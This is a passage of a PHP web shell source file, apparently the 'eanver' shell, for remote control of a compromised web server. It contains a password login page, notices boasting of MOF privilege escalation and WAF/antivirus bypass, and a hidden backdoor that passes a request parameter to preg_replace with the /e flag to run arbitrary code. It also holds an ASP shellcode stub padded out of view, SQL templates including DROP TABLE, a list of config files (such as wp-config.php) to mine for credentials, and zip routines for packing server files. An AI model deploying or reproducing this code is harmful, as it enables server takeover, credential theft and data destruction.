<!DOCTYPE html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"/>
<title>?¶ ¶«?????????????????! ??????????????</title>
<style type="text/css">
body{background-color:#000}input,select,textarea{font-size:12px;background-color:#ddd;border:1px solid #fff}body,div{font-size:10px;color:#ddd}.form-control{display:block;width:100%;height:38px;padding:8px 12px;font-size:14px;line-height:1.428571429;color:#555;vertical-align:middle;background-color:#fff;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075);-webkit-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}.btn{display:inline-block;margin-bottom:0;font-size:14px;font-weight:500;line-height:1.428571429;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;border:1px solid transparent;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}.btn-primary{color:#fff;background-color:#000;border-color:#ffffff}
</style>
</head>
<body scroll="no">
<div align="center">
<form method='post'>
<br><br><br><br>Your Password:
<input style="Width:70pt;height:4pt;display:inline-block;" class="form-control" type="password" name="envlpass">
<input style="height:18pt;font-family:Microsoft YaHei" class="btn btn-primary" type="submit" value="???">
</form>
<br><br>
<span style="color: #13e08c;font-family: Tahoma, Geneva, sans-serif;font-size:14px;">
<b>??????:{$Server_OS}<br>php?∑⁄:{$Server_Soft}<br>???????∑⁄:{$web_server}</b>
</span><br><br><br>
</div>
<center><font size="3">
<b>[<font color="red">+</font>]</b> ?????????????,?????????????????????????<br>
<b>[<font color="red">+</font>]</b> ???Mof??˝n???,Windows2003???????????<br>
<b>[<font color="red">+</font>]</b> ???¶ ?Waf-D?????????????????????????????360?????????360??????<br>
</center>
<body>
</html>
END;
    @preg_replace("/[_]/e", $_REQUEST['h'], "__");
}
function html_sql()
{
    html_input("text", "sqlhost", "localhost", "<br>MYSQL???", "30");
    html_input("text", "sqlport", "3306", "<br>MYSQL???", "30");
    html_input("text", "sqluser", "root", "<br>MYSQL???", "30");
    html_input("password", "sqlpass", "", "<br>MYSQL????", "30");
    html_input("text", "sqldb", "dbname", "<br>MYSQL????", "30");
    html_input("submit", "sqllogin", "???", "<br>");
    html_n('</form>');
}
function Mysql_Len($data, $len)
{
    if (strlen($data) < $len) {
        return $data;
    }
    return substr_replace($data, '...', $len);
}
function html_n($data)
{
    echo "{$data}\n";
}
/*---css---*/
function css_img($img)
{
    $images = array("exe" => "R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7" . "WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt" . "xhIAOw==", "dir" => "R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAA" . "AAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdE" . "oMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=", "txt" => "R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ" . "SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7" . "UpPWG3Ig6Hq/XmRjuZwkAAA7", "html" => "R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz" . "c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P" . "KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk" . "Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR" . "ADs=", "js" => "R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH" . "k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs" . "a00AjYYBbc/o9HjNniUAADs=", "xml" => "R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA" . "gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx" . "OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ" . "IQA7", "mp3" => "R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU" . "aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc" . "IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=", "img" => "R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci" . "Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd" . "FxEAOw==", "title" => "R0lGODlhDgAOAMQAAOGmGmZmZv//xVVVVeW6E+K2F/+ZAHNzcf+vAGdnaf/AAHt1af+" . "mAP/FAP61AHt4aXNza+WnFP//zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "ACH5BAAHAP8ALAAAAAAOAA4AAAVJYPIcZGk+wUM0bOsWoyu35KzceO3sjsTvDR1P4uMFDw2EEkGUL" . "I8NhpTRnEKnVAkWaugaJN4uN0y+kr2M4CIycwEWg4VpfoCHAAA7", "rar" => "R0lGODlhEAAQAPf/AAAAAAAAgAAA/wCAAAD/AACAgIAAAIAAgP8A/4CAAP//AMDAwP///wAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" . "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/ACH5BAEKAP8ALAAAAAAQABAAAAiFAP0YEEhwoEE/" . "/xIuEJhgQYKDBxP+W2ig4cOCBCcyoHjAQMePHgf6WbDxgAIEKFOmHDmSwciQIDsiXLgwgZ+b" . "OHOSXJiz581/LRcE2LigqNGiLEkKWCCgqVOnM1naDOCHqtWbO336BLpzgAICYMOGRdgywIIC" . "aNOmRcjVj02tPxPCzfkvIAA7");
    header('Content-type: image/gif');
    echo base64_decode($images[$img]);
    die;
}
function css_showimg($file)
{
    $it = substr($file, -3);
    switch ($it) {
        case "jpg":
        case "gif":
        case "bmp":
        case "png":
        case "ico":
            return 'img';
            break;
        case "htm":
        case "tml":
            return 'html';
            break;
        case "exe":
        case "com":
            return 'exe';
            break;
        case "xml":
        case "doc":
            return 'xml';
            break;
        case ".js":
        case "vbs":
            return 'js';
            break;
        case "mp3":
        case "wma":
        case "wav":
        case "swf":
        case ".rm":
        case "avi":
        case "mp4":
        case "mvb":
            return 'mp3';
            break;
        case "rar":
        case "tar":
        case ".gz":
        case "zip":
        case "iso":
            return 'rar';
            break;
        default:
            return 'txt';
            break;
    }
}
function css_js($num, $code = '')
{
    if ($num == "shellcode") {
        return '<%@ LANGUAGE="JavaScript" %>
		<%
		                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
		%>';
    }
    html_n('<script language="javascript">');
    if ($num == "1") {
        html_n('	function rusurechk(msg,url){
		smsg = "FileName:[" + msg + "]\\nPlease Input New File:";
		re = prompt(smsg,msg);
		if (re){
			url = url + re;
			window.location = url;
		}
	}
	function rusuredel(msg,url){
		smsg = "Do You Suer Delete [" + msg + "] ?";
		if(confirm(smsg)){
			URL = url + msg;
			window.location = url;
		} 
	}
	function Delok(msg,gourl)
	{
		smsg = "???????[" + unescape(msg) + "]???";
		if(confirm(smsg))
		{
			if(gourl == \'b\')
			{
				document.getElementById(\'actall\').value = escape(gourl);
				document.getElementById(\'fileall\').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != \'chkall\')
			e.checked = form.chkall.checked;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "?????????:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert(\'???????????!???:yyyy-mm-dd hh:mm:ss\');return false;}
			else{document.getElementById(\'actall\').value = gourl; document.getElementById(\'inver\').value = re; document.getElementById(\'fileall\').submit();}
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById(\'actall\').value = actid;
			document.getElementById(\'inver\').value = escape(re);
			document.getElementById(\'fileall\').submit();
		}
	}');
    } elseif ($num == "2") {
        html_n('var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById(\'mtime\').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert(\'???????????!???:yyyy-mm-dd hh:mm:ss\');return false;}
	else{document.getElementById(\'editor\').submit();}
}');
    } elseif ($num == "3") {
        html_n('function Full(i){
   if(i==0 || i==5){
     return false;
   }
  Str = new Array(12);  
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\\db.mdb";
	Str[2] = "Driver={Sql Server};Server=,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[4] = "Provider=MSDAORA.1;Password=????;User ID=???;Data Source=??????;Persist Security Info=True;";
	Str[6] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[7] = "INSERT INTO [TableName](USER,PASS) VALUES(\'eanver\',\'mypass\')";
	Str[8] = "DELETE FROM [TableName] WHERE ID=100";
	Str[9] = "UPDATE [TableName] SET USER=\'eanver\' WHERE ID=100";
	Str[10] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[11] = "DROP TABLE [TableName]";
	Str[12] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[13] = "ALTER TABLE [TableName] DROP COLUMN PASS";
	if(i<=4){
	  DbForm.string.value = Str[i];
  }else{
  	DbForm.sql.value = Str[i];
  }
  return true;
  }');
    } elseif ($num == "4") {
        html_n('function Fulll(i){
   if(i==0){
     return false;
   }
  Str = new Array(8);  
	Str[1] = "config.inc.php";
	Str[2] = "config.inc.php";
	Str[3] = "config_base.php";
	Str[4] = "config.inc.php";
	Str[5] = "config.php";
	Str[6] = "wp-config.php";
	Str[7] = "config.php";
	Str[8] = "mysql.php";
	sform.code.value = Str[i];
  return true;
  }');
    }
    html_n('</script>');
}
function css_left()
{
    html_n('<style type="text/css">
	.menu{width:140px;margin-left:auto;margin-right:auto;}
	.menu dl{margin-top:2px;}
	.menu dl dt{top left repeat-x;}
	.menu dl dt a{height:22px;padding-top:1px;line-height:18px;width:140px;display:block;color:#FFFFFF;font-weight:bold;
	text-decoration:none; 10px 7px no-repeat;text-indent:20px;letter-spacing:2px;}
	.menu dl dt a:hover{color:#dddddd;}
	.menu dl dd ul{list-style:none;}
	.menu dl dd ul li a{color:#9f9f9f;height:21px;widows:140px;display:block;line-height:21px;text-indent:22px;
	background:#202020 no-repeat 13px 11px;border-color:#202020 #202020 #202020 #202020;margin-top:2px;
	border-style:solid;border-width:1px;}
	.menu dl dd ul li a:hover{background:#FFF no-repeat 13px 11px;color:#FF6600;}
	</STYLE>');
    html_n('<script language="javascript">
	function getObject(objectId){
	 if(document.getElementById && document.getElementById(objectId)) {
	 return document.getElementById(objectId);
	 }
	 else if (document.all && document.all(objectId)) {
	 return document.all(objectId);
	 }
	 else if (document.layers && document.layers[objectId]) {
	 return document.layers[objectId];
	 }
	 else {
	 return false;
	 }
	}
	function showHide(objname){
	  var obj = getObject(objname);
	    if(obj.style.display == "none"){
			obj.style.display = "block";
		}else{
			obj.style.display = "none";
		}
	}
	</script><div class="menu">');
}
function css_main()
{
    html_n('<style type="text/css">
	*{padding:0px;margin:0px;}
	body,td{font-size: 12px;color:#15c15bd9;background:#1f1f1f;}input,select,textarea{font-size:12px;line-height:1.428571429;color:#555;vertical-align:middle;background-color:#FFFFCC;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075);-webkit-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}
	body{color:#FFFFFF;font-family:Verdana, Arial, Helvetica, sans-serif;
	height:100%;overflow-y:auto;background:#0d0d0d;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}
    a{color:#15c15bd9;text-decoration: none;}a:hover{color:red;background:#000}
	.actall{background:#000000;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
    .form-control{width:50%;height:18px;font-size:14px;line-height:1.428571429;color:#555;vertical-align:middle;background-color:#fff;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075);-webkit-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}.btn{display:inline-block;margin-bottom:0;font-size:14px;font-weight:500;line-height:1.428571429;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;border:1px solid transparent;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}.btn-primary{color:#bbbbbb;background-color:#000;border-color:#bbbbbb}
	</STYLE>
	<table width="85%" border=0 bgcolor="#555555" align="center">');
}
function css_foot()
{
    html_n('</td></tr></table>');
}
class eanver
{
    var $out = '';
    function eanver($dir)
    {
        if (@function_exists('gzcompress')) {
            if (count($dir) > 0) {
                foreach ($dir as $file) {
                    if (is_file($file)) {
                        $filecode = file_get_contents($file);
                        if (is_array($dir)) {
                            $file = basename($file);
                        }
                        $this->filezip($filecode, $file);
                    }
                }
                $this->out = $this->packfile();
            }
            return true;
        } else {
            return false;
        }
    }
    var $datasec = array();
    var $ctrl_dir = array();
    var $eof_ctrl_dir = "PK\5\6\0\0\0\0";
    var $old_offset = 0;
    function at($atunix = 0)
    {
        $unixarr = $atunix == 0 ? getdate() : getdate($atunix);
        if ($unixarr['year'] < 1980) {
            $unixarr['year'] = 1980;
            $unixarr['mon'] = 1;
            $unixarr['mday'] = 1;
            $unixarr['hours'] = 0;
            $unixarr['minutes'] = 0;
            $unixarr['seconds'] = 0;
        }
        return $unixarr['year'] - 1980 << 25 | $unixarr['mon'] << 21 | $unixarr['mday'] << 16 | $unixarr['hours'] << 11 | $unixarr['minutes'] << 5 | $unixarr['seconds'] >> 1;
    }
    function filezip($data, $name, $time = 0)
    {
        $name = str_replace('\\', '/', $name);
        $dtime = dechex($this->at($time));
        $hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x' . $dtime[2] . $dtime[3] . '\\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr = "PK\3\4";
        $fr .= "\24\0";
        $fr .= "\0\0";
        $fr .= "\10\0";
        $fr .= $hexdtime;
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $c_len = strlen($zdata);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $fr .= pack('v', strlen($name));
        $fr .= pack('v', 0);
        $fr .= $name;
        $fr .= $zdata;
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $this->datasec[] = $fr;
        $new_offset = strlen(implode('', $this->datasec));
        $cdrec = "PK\1\2";
        $cdrec .= "\0\0";
        $cdrec .= "\24\0";
        $cdrec .= "\0\0";
        $cdrec .= "\10\0";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name));
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('V', 32);
        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset = $new_offset;
        $cdrec .= $name;
        $this->ctrl_dir[] = $cdrec;
    }
    function packfile()
    {
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\0\0";
    }
}
class zip
{
    var $total_files = 0;
    var $total_folders = 0;
    function Extract($zn, $to, $index = array(-1))
    {
        $ok = 0;
        $zip = @fopen($zn, 'rb');
        if (!$zip) {
            return -1;
        }
        $cdir = $this->ReadCentralDir($zip, $zn);
        $pos_entry = $cdir['offset'];
        if (!is_array($index)) {
            $index = array($index);
        }
        for ($i = 0; $index[$i]; $i++) {
            if (intval($index[$i]) != $index[$i] || $index[$i] > $cdir['entries']) {
                return -1;
            }
        }
        for ($i = 0; $i < $cdir['entries']; $i++) {
            @fseek($zip, $pos_entry);
            $header = $this->ReadCentralFileHeaders($zip);
            $header['index'] = $i;
            $pos_entry = ftell($zip);
            @rewind($zip);
            fseek($zip, $header['offset']);
            if (in_array("-1", $index) || in_array($i, $index)) {
                $stat[$header['filename']] = $this->ExtractFile($header, $to, $zip);
            }
        }
        fclose($zip);
        return $stat;
    }
    function ReadFileHeader($zip)
    {
        $binary_data = fread($zip, 30);
        $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);
        $header['filename'] = fread($zip, $data['filename_len']);
        if ($data['extra_len'] != 0) {
            $header['extra'] = fread($zip, $data['extra_len']);
        } else {
            $header['extra'] = '';
        }
        $header['compression'] = $data['compression'];
        $header['size'] = $data['size'];
        $header['compressed_size'] = $data['compressed_size'];
        $header['crc'] = $data['crc'];
        $header['flag'] = $data['flag'];
        $header['mdate'] = $data['mdate'];
        $header['mtime'] = $data['mtime'];
        if ($header['mdate'] && $header['mtime']) {
            $hour = ($header['mtime'] & 0xf800) >> 11;
            $minute = ($header['mtime'] & 0x7e0) >> 5;
            $seconde = ($header['mtime'] & 0x1f) * 2;
            $year = (($header['mdate'] & 0xfe00) >> 9) + 1980;
            $month = ($header['mdate'] & 0x1e0) >> 5;
            $day = $header['mdate'] & 0x1f;
            $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
        } else {
            $header['mtime'] = time();
        }
        $header['stored_filename'] = $header['filename'];
        $header['status'] = "ok";
        return $header;
    }
    function ReadCentralFileHeaders($zip)
    {
        $binary_data = fread($zip, 46);
        $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);
        if ($header['filename_len'] != 0) {
            $header['filename'] = fread($zip, $header['filename_len']);
        } else {
            $header['filename'] = '';
        }
        if ($header['extra_len'] != 0) {
            $header['extra'] = fread($zip, $header['extra_len']);
        } else {
            $header['extra'] = '';
        }
        if ($header['comment_len'] != 0) {
            $header['comment'] = fread($zip, $header['comment_len']);
        } else {
            $header['comment'] = '';
        }
        if ($header['mdate'] && $header['mtime']) {
            $hour = ($header['mtime'] & 0xf800) >> 11;
            $minute = ($header['mtime'] & 0x7e0) >> 5;
            $seconde = ($header['mtime'] & 0x1f) * 2;
            $year = (($header['mdate'] & 0xfe00) >> 9) + 1980;
            $month = ($header['mdate'] & 0x1e0) >> 5;
            $day = $header['mdate'] & 0x1f;
            $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
        } else {
            $header['mtime'] = time();
        }
        $header['stored_filename'] = $header['filename'];
        $header['status'] = 'ok';
        if (substr($header['filename'], -1) == '/') {
            $header['external'] = 0x41ff0010;
        }
        return $header;
    }
    function ReadCentralDir($zip, $zip_name)
    {
        $size = filesize($zip_name);
        if ($size < 277) {
            $maximum_size = $size;
        } else {
            $maximum_size = 277;
        }
        @fseek($zip, $size - $maximum_size);
        $pos = ftell($zip);
        $bytes = 0x0;
        while ($pos < $size) {
            $byte = @fread($zip, 1);
            $bytes = $bytes << 8 | ord($byte);
            if ($bytes == 0x504b0506 or $bytes == 0x2e706870504b0506) {
                $pos++;
                break;
            }
            $pos++;
        }
        $fdata = fread($zip, 18);
        $data = @unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $fdata);
        if ($data['comment_size'] != 0) {
            $centd['comment'] = fread($zip, $data['comment_size']);
        } else {
            $centd['comment'] = '';
        }
        $centd['entries'] = $data['entries'];
        $centd['disk_entries'] = $data['disk_entries'];
        $centd['offset'] = $data['offset'];
        $centd['disk_start'] = $data['disk_start'];
        $centd['size'] = $data['size'];
        $centd['disk'] = $data['disk'];
        return $centd;
    }
    function ExtractFile($header, $to, $zip)
    {
        $header = $this->readfileheader($zip);
        if (substr($to, -1) != "/") {
            $to .= "/";
        }
        if ($to == './') {
            $to = '';
        }
        $pth = explode("/", $to . $header['filename']);
        $mydir = '';
        for ($i = 0; $i < count($pth) - 1; $i++) {
            if (!$pth[$i]) {
                continue;
            }
            $mydir .= $pth[$i] . "/";
            if (!is_dir($mydir) && @mkdir($mydir, 0777) || ($mydir == $to . $header['filename'] || $mydir == $to && $this->total_folders == 0) && is_dir($mydir)) {
                @chmod($mydir, 0777);
                $this->total_folders++;
                echo "??: {$mydir}<br>";
            }
        }
        if (strrchr($header['filename'], '/') == '/') {
            return;
        }
        if (!($header['external'] == 0x41ff0010) && !($header['external'] == 16)) {
            if ($header['compression'] == 0) {
                $fp = @fopen($to . $header['filename'], 'wb');
                if (!$fp) {
                    return -1;
                }
                $size = $header['compressed_size'];
                while ($size != 0) {
                    $read_size = $size < 2048 ? $size : 2048;
                    $buffer = fread($zip, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }
                fclose($fp);
                touch($to . $header['filename'], $header['mtime']);
            } else {
                $fp = @fopen($to . $header['filename'] . '.gz', 'wb');
                if (!$fp) {
                    return -1;
                }
                $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']), Chr(0x0), time(), Chr(0x0), Chr(3));
                fwrite($fp, $binary_data, 10);
                $size = $header['compressed_size'];
                while ($size != 0) {
                    $read_size = $size < 1024 ? $size : 1024;
                    $buffer = fread($zip, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }
                $binary_data = pack('VV', $header['crc'], $header['size']);
                fwrite($fp, $binary_data, 8);
                fclose($fp);
                $gzp = @gzopen($to . $header['filename'] . '.gz', 'rb') or die("Cette archive est compress");
                if (!$gzp) {
                    return -2;
                }
                $fp = @fopen($to . $header['filename'], 'wb');
                if (!$fp) {
                    return -1;
                }
                $size = $header['size'];
                while ($size != 0) {
                    $read_size = $size < 2048 ? $size : 2048;
                    $buffer = gzread($gzp, $read_size);
                    $binary_data = pack('a' . $read_size, $buffer);
                    @fwrite($fp, $binary_data, $read_size);
                    $size -= $read_size;
                }
                fclose($fp);
                gzclose($gzp);
                touch($to . $header['filename'], $header['mtime']);
                @unlink($to . $header['filename'] . '.gz');
            }
        }
        $this->total_files++;
        echo "???: {$to}{$header['filename']}<br>";
        return true;
    }
}
ob_end_flush();